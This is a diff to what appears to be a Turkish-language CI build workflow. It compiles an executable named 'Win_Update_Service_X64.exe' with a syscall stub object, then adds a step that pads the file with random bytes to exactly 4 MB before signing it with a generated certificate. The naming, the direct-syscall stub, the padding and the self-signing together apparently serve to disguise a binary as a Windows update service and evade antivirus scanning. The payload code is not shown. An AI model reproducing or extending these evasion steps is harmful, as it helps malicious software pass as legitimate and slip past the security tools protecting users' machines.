@@ -27,6 +27,21 @@ jobs:
       run: |
         cl.exe /O2 /EHsc main.cpp syscall_stub.obj /Fe:Win_Update_Service_X64.exe /link user32.lib gdi32.lib advapi32.lib
 
+    - name: EXE Boyutunu 4 MB'a Sabitle (Padding)
+      shell: powershell
+      run: |
+        # Hedef boyut: 4 * 1024 * 1024 byte (4 MB)
+        $targetSize = 4 * 1024 * 1024
+        $currentSize = (Get-Item "Win_Update_Service_X64.exe").Length
+        
+        if ($currentSize -lt $targetSize) {
+            $bytesToAdd = $targetSize - $currentSize
+            $rand = New-Object Byte[] $bytesToAdd
+            (New-Object Random).NextBytes($rand)
+            [System.IO.File]::AppendAllBytes("Win_Update_Service_X64.exe", $rand)
+            Write-Host "Dosya boyutu 4 MB olarak güncellendi. Eklenen bayt: $bytesToAdd"
+        }
+
     - name: Sertifika Olustur ve EXE Imzala
       shell: powershell
       run: |
